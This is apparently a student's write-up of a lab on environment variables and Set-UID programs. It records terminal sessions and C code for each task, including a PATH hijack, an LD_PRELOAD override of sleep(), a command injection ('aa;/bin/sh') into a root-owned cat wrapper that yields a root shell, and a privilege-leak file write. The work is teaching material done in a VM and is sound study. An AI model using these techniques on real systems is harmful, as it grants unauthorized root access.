# Task 1

to print value of env variable we use ***printenv*** 
i add env variable called **var_name** and it's value is  **haithem** 


```bash
[06/04/23]seed@VM:~$ printenv PWD
/home/seed
[06/04/23]seed@VM:~$ env |grep PWD
PWD=/home/seed
[06/04/23]seed@VM:~$ export var_name=haithem
[06/04/23]seed@VM:~$ printenv var_name
haithem
[06/04/23]seed@VM:~$ env | grep var_name
var_name=haithem
[06/04/23]seed@VM:~$ unset var_name
[06/04/23]seed@VM:~$ printenv var_name
[06/04/23]seed@VM:~$ cd Desktop/
```
To remove the variable we use with command ***unset***

# Task 2

To compile the the **myprintenv.c** i use ***gcc*** and it will generate **a.out** and i will put his output to file1

````bash
[06/04/23]seed@VM:~/.../Labsetup$ gcc myprintenv.c 
[06/04/23]seed@VM:~/.../Labsetup$ ./a.out > file1
[06/04/23]seed@VM:~/.../Labsetup$ ls
a.out  cap_leak.c  catall.c  file1  myenv.c myprintenvc
````
## Step 2.
Now comment out the printenv()statement in the child process case (Line1), and uncomment the printenv()statement in the parent process case (Line2). Compile and run the code again,  anddescribe your observation. Save the output in another file.
````c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

extern char **environ;

void printenv()
{
  int i = 0;
  while (environ[i] != NULL) {
     printf("%s\n", environ[i]);
     i++;
  }
}

void main()
{
  pid_t childPid;
  switch(childPid = fork()) {
    case 0:  /* child process */
      // printenv();          
      exit(0);
    default:  /* parent process */
       printenv();       
      exit(0);
  }
}

````

after i will compile it and save the output the **file2**

````bash
[06/04/23]seed@VM:~/.../Labsetup$ gcc myprintenv.c 
[06/04/23]seed@VM:~/.../Labsetup$ ./a.out > file2
[06/04/23]seed@VM:~/.../Labsetup$ ls
a.out  cap_leak.c  catall.c  file1  file2  myenv.c  myprintenv.c
````
when i use ***diff*** command it doesn't show anything 
it mean that there is no different between the **file1** and **file2**
````bash
[06/04/23]seed@VM:~/.../Labsetup$ diff file1 file2
[06/04/23]seed@VM:~/.../Labsetup$ 
````

# Task 3

when i compile and run **myenv.c** it doesn't show anything 

````bash
[06/04/23]seed@VM:~/.../Labsetup$ gcc myenv.c 
[06/04/23]seed@VM:~/.../Labsetup$ ./a.out 
[06/04/23]seed@VM:~/.../Labsetup$ 
````
## Step 2.
when i change the invocation of execve on line 1

````c
#include <unistd.h>

extern char **environ;

int main()
{
  char *argv[2];

  argv[0] = "/usr/bin/env";
  argv[1] = NULL;

  execve("/usr/bin/env", argv, environ);  

  return 0 ;
}
````

and i compile and run the program it will show this (it is long output i don't provide all of it ) 

````bash
[06/04/23]seed@VM:~/.../Labsetup$ gcc myenv.c 
[06/04/23]seed@VM:~/.../Labsetup$ ./a.out 
SHELL=/bin/bash
SESSION_MANAGER=local/VM:@/tmp/.ICE-unix/2326,unix/VM:/tmp/.ICE-unix/2326
QT_ACCESSIBILITY=1
COLORTERM=truecolor
XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg
XDG_MENU_PREFIX=gnome-
GNOME_DESKTOP_SESSION_ID=this-is-deprecated
GNOME_SHELL_SESSION_MODE=ubuntu
SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
XMODIFIERS=@im=ibus
DESKTOP_SESSION=ubuntu
SSH_AGENT_PID=2275
GTK_MODULES=gail:atk-bridge
PWD=/home/seed/Desktop/Env_var/Labsetup
LOGNAME=seed
XDG_SESS......
````

**conclusion :** the result is the same as running the command normally 
# Task 4 
i create file called **task4_system_func.c** to run 

### task4_system_func.c
````c
#include <stdio.h>
#include <stdlib.h>
int main()
{
system("/usr/bin/env");`
return 0 ;
}
````

after I compile and run this program 

````bash
[06/04/23]seed@VM:~/.../Labsetup$ gcc task4_system_func.c 
[06/04/23]seed@VM:~/.../Labsetup$ ./a.out 
GJS_DEBUG_TOPICS=JS ERROR;JS LOG
LESSOPEN=| /usr/bin/lesspipe %s
USER=seed
SSH_AGENT_PID=2275
XDG_SESSION_TYPE=x11
SHLVL=1
HOME=/home/seed
OLDPWD=/home/seed/Desktop/Env_var
DESKTOP_SESSION=ubuntu
GNOME_SHELL_SESSION_MODE=ubuntu
GTK_MODULES=gail:atk-bridge
MANAGERPID=2059
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
COLORTERM=truecolor
IM_CONFIG_PHASE=1
LOGNAME=seed
JOURNAL_STREAM=9:36475
_=./a.out
XDG_SESS
````
**conclution :** the result is the same


# Task 5
I create file called **print_all_env.c** 

````c
#include <stdio.h>
#include <stdlib.h>
extern char**environ;
int main(){
int i = 0;
while (environ[i] != NULL) {
printf("%s\n", environ[i]);i++;
}
}
````
After when i run the program normally it show  

````bash
[06/04/23]seed@VM:~/.../Labsetup$ gcc print_all_env.c 
[06/04/23]seed@VM:~/.../Labsetup$ ./a.out 
SHELL=/bin/bash
SESSION_MANAGER=local/VM:@/tmp/.ICE-unix/2326,unix/VM:/tmp/.ICE-unix/2326
QT_ACCESSIBILITY=1
COLORTERM=truecolor
XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdg
XDG_MENU_PREFIX=gnome-
GNOME_DESKTOP_SESSION_ID=this-is-deprecated
GNOME_SHELL_SESSION_MODE=ubuntu
SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
XMODIFI....
````

## step 2
after i will change the ownership to root 


```bash
[06/15/23]seed@VM:~/.../Labsetup$ sudo chown root a.out 
[06/15/23]seed@VM:~/.../Labsetup$  sudo chmod 4755 a.out 
[06/15/23]seed@VM:~/.../Labsetup$ 


```
## step 3 
```bash 
[06/15/23]seed@VM:~/.../Labsetup$ export PATH="/bin:/usr/bin"
[06/15/23]seed@VM:~/.../Labsetup$ printenv PATH
/bin:/usr/bin
[06/15/23]seed@VM:~/.../Labsetup$ export LD_LIBRARY_PATH="haithemLib"
[06/15/23]seed@VM:~/.../Labsetup$ printenv LD_LIBRARY_PATH
haithemLib
[06/15/23]seed@VM:~/.../Labsetup$ export haithem_var="qjksdnsjkf"
[06/15/23]seed@VM:~/.../Labsetup$ ./a.out | grep "haithem_var\|LD_LIBRARY_PATH\|PATH"
haithem_var=qjksdnsjkf
WINDOWPATH=2
PATH=/bin:/usr/bin
[06/15/23]seed@VM:~/.../Labsetup$ 
```

# Task 6

```bash 
[06/15/23]seed@VM:~/.../Labsetup$ gedit lsProgram.c
```
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
	printf("My malicious code!!\n");
	if (geteuid() == 0) {
		printf("I have root privilege!\n");
	}
	return 0;
}
```
```bash 
[06/15/23]seed@VM:~/.../Labsetup$ gcc lsProgram.c 
[06/15/23]seed@VM:~/.../Labsetup$ sudo chown root ./a.out
[06/15/23]seed@VM:~/.../Labsetup$ sudo chmod 4755 ./a.out
[06/15/23]seed@VM:~/.../Labsetup$ sudo ln -sf /bin/zsh /bin/sh
[06/15/23]seed@VM:~/.../Labsetup$ export PATH=/home/seed:$PATH
[06/15/23]seed@VM:~/.../Labsetup$ ./a.out
My malicious code!!
I have root privilege!
[06/15/23]seed@VM:~/.../Labsetup$ 
```


# Task 7 
```bash 
[06/15/23]seed@VM:~/.../Labsetup$ gedit mylib.c
```

```c
#include <stdio.h>
void sleep (int s)
{
/*If this is invoked by a privileged program,you can do damages here!*/
printf("I am not sleeping!\n");
}
```


```bash 
[06/15/23]seed@VM:~/.../Labsetup$ gcc -fPIC -g -c mylib.c
[06/15/23]seed@VM:~/.../Labsetup$ gcc -fPIC -g -c mylib.c
[06/15/23]seed@VM:~/.../Labsetup$ export LD_PRELOAD=./libmylib.so.1.0.1
[06/15/23]seed@VM:~/.../Labsetup$ gcc -o myprog myprog.c
[06/15/23]seed@VM:~/.../Labsetup$ ./myprog
I am not sleeping!
```


```bash 
[06/15/23]seed@VM:~/.../Labsetup$ sudo chmod u+s myprog
[06/15/23]seed@VM:~/.../Labsetup$ ./myprog
I am not sleeping!
[06/15/23]seed@VM:~/.../Labsetup$ sudo su
root@VM:/home/seed/Desktop/Env_var/Labsetup# export LD_PRELOAD=./libmylib.so.1.0.1 
root@VM:/home/seed/Desktop/Env_var/Labsetup# ./myprog 
root@VM:/home/seed/Desktop/Env_var/Labsetup# exit
exit
[06/15/23]seed@VM:~/.../Labsetup$ 
[06/15/23]seed@VM:~/.../Labsetup$ ./myprog
I am not sleeping!
```

```bash 
[06/15/23]seed@VM:~/.../Labsetup$ sudo su
root@VM:/home/seed/Desktop/Env_var/Labsetup# useradd -d /usr/user1 -m user1
root@VM:/home/seed/Desktop/Env_var/Labsetup# chown user1 myprog
root@VM:/home/seed/Desktop/Env_var/Labsetup# chgrp user1 myprog
root@VM:/home/seed/Desktop/Env_var/Labsetup# exit
exit
[06/15/23]seed@VM:~/.../Labsetup$ export LD_PRELOAD=./libmylib.so.1.0.1
[06/15/23]seed@VM:~/.../Labsetup$ ./myprog 
I am not sleeping!
[06/15/23]seed@VM:~/.../Labsetup$ 
```

# Task 8

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
        char *v[3];
        char *command;

        if(argc < 2){
                printf("Please type a file name.\n");
                return 1;
        }

        v[0] = "/bin/cat"; v[1]=argv[1]; v[2] = NULL;

        command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
        sprintf(command, "%s %s", v[0], v[1]);

        system(command);
        //execve(v[0], v, NULL);

        return 0;
}
```

```bash
[06/15/23]seed@VM:~/.../Labsetup$ gedit task8.c
[06/15/23]seed@VM:~/.../Labsetup$ gcc -o task8 task8.c
[06/15/23]seed@VM:~/.../Labsetup$ sudo chown root task8
[06/15/23]seed@VM:~/.../Labsetup$ sudo chmod 4755 task8
[06/15/23]seed@VM:~/.../Labsetup$ sudo ln -sf /bin/zsh /bin/sh
[06/15/23]seed@VM:~/.../Labsetup$ 
[06/15/23]seed@VM:~/.../Labsetup$ ./task8  "aa;/bin/sh"
/bin/cat: aa: No such file or directory
# id
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
# 

```

# Task 9

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

void main()
{
        int fd;

        /* Assuem that /etc/zzz is an important system file,
         * and it is owned by root with permission 4755.
         * Before running this program, you should creat
         * the file /etc/zzz first */

        fd = open("/etc/zzz", O_RDWR | O_APPEND);

        if(fd ==-1){
                printf("Cannot open /etc/zzz\n");
                exit(0);
        }

        /* Simulate the tasks conducted by the program */
        sleep(1);

        /* After the task, the root privileges are no longer needed,
           it's time to relinquish the root privileges permanently. */
        setuid(getuid());       /* getuid() returns the real uid*/

        if(fork()){ /* in the parent process */
                close(fd);
                exit(0);
        } else{ /* in the child process */
        /* Now, assume that the child process is compromised, malicious
           atackers have injected the following statements into this process*/

        write (fd, "Malicious Data\n", 15);
        close(fd);
        }
}
```

```bash
[06/15/23]seed@VM:~/.../Labsetup$ gcc -o task9 task9.c
[06/15/23]seed@VM:~/.../Labsetup$ sudo chown root task9
[06/15/23]seed@VM:~/.../Labsetup$ sudo chmod 4755 task9
[06/15/23]seed@VM:~/.../Labsetup$ sudo touch /etc/zzz
```


 
